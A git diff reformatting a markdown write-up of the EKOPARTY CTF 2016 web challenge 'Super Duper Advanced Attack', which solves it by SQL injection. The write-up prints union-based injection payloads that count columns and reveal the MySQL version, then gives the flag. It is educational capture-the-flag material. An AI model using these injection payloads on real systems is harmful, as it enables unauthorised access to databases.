@@ -1,30 +1,24 @@
----
-layout: post
-title: EKOPARTY CTF 2016 - Super Duper Advanced Attack (Web 100)
-date: 2016-10-29 12:15:00
-categories: 
-- CTF 
-- EKOPARTY CTF 2016
----
+# Super Duper Advanced Attack
 
-## Challenge
+### Challenge
+- **Competition:** EKOPARTY CTF 2016
+- **Category:** Web
+- **Points:** 100
 
 > Can you find the flag?
 >
 > http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000
 
 
-## Solution
+### Solution
 
-Upon visiting the challenge page, it looked like a SQL injection vulnerability may exist.  After a bit of experimenting, I was able to successfully determine and display the number of columns in the query on the page:
+Upon visiting the challenge page, it looked like a SQL injection vulnerability may exist.  After a bit of experimenting, I was able to successfully determine and display the number of columns in the query on the page: 
 
-```none
-'UNION(SELECT(1),2);-- -
-```
+`'UNION(SELECT(1),2);-- -`
 
 Further, I was able to display to software version information:
 
-```none
+```bash
 'UNION(SELECT(@@VERSION),2);-- -
 5.7.15-0ubuntu0.16.04.1
 ```
@@ -44,7 +38,7 @@ Finally, I looked at the potential local variable with the flag information in i
 Success!  The flag was in fact stored in this local variable.
 
 
-## Flag
+### Flag
 
 ```none
 EKO{do_not_forget_session_variables}
